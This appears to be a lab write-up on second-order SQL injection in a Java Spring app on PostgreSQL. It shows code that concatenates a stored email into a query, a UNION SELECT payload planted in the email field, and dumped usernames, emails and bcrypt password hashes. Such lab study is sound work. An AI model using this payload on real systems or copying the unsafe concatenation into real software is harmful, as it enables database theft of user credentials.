In PostgreSQL a second order SQL happens when a query is first saved into a variable and successively re-used to perform the actual query itself(unsafely since no sanitation is applied).
Let's take this code as example

### ProfileController.java
```
@GetMapping({"/profile/{id}"})
public String profile(@PathVariable int id, Model model, HttpServletResponse response) throws IOException {
    String sql;
    User user;
    try {
        sql = "SELECT username, name, description, email, id FROM users WHERE id = ?";
        user = (User)this.jdbcTemplate.queryForObject(sql, new Object[]{id}, new BeanPropertyRowMapper(User.class));
    } catch (Exception var8) {
        response.sendRedirect("/");
        return null;
    }

    sql = "SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC";
    List posts = this.jdbcTemplate.queryForList(sql);
    model.addAttribute("user", user);
    model.addAttribute("posts", posts);
    UserDetailsImpl userDetails = (UserDetailsImpl)SecurityContextHolder.getContext().getAuthentication().getPrincipal();
    model.addAttribute("userDetails", userDetails);
    return "profile";
}
```


### Explanation:
The first part extrapolates the user information like username, desc, email, id etc and it saves it for later user.
The second part uses the query from before to read the posts from the user id. This is insecure as no sanitation is applied before use and can be actually exploited!

2)Find the query in the code that can be used as carrier to perform a second order injection(in the example seems like it is saved into edit profile function).
```
grep -irnE 'UPDATE.*email'
com/bmdyy/bluebird/controller/ProfileController.java:70:               sql = "UPDATE users SET name = ?, description = ?, email = ?";
com/bmdyy/bluebird/controller/ProfileController.java:85:                  this.jdbcTemplate.update(sql, new Object[]{name, description, email, passwordHash, userDetails.getId()});
com/bmdyy/bluebird/controller/ProfileController.java:87:                  this.jdbcTemplate.update(sql, new Object[]{name, description, email, userDetails.getId()});

```


3)The payload in injected into(email/payload EDIT) will be used into /profile/{id}
`SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORD§ER BY posted_at DESC`

Then you can use this as email payload
`' UNION SELECT email,username,password,'4',5 FROM users--` 

4)Lastly go back to your profile to check the result
http://10.129.204.249:8080/profile/331   
Result:
```
4@$2b$12$TvVjSlTVWahM/MFCifYCKezGes9dAGeGwHP3EerZuZSADAf0ZwOMO · ecstaticBurritos1
Dwain.Ball@proton.me
4@$2b$12$XCMyUGBA6oPL23N6LJ45seUGfImud1kiJFy7.p4rfVtdrAFelrRqS · boastfulHoopoe9
Chris.Collette@proton.me
4@$2b$12$pxHmpJrIBNoTRikUYdTeO.KuNqvmt8JJQAlvqzLKyOljBiZMnnBOC · trustingSardines9
Hazel.Mixon@proton.me
```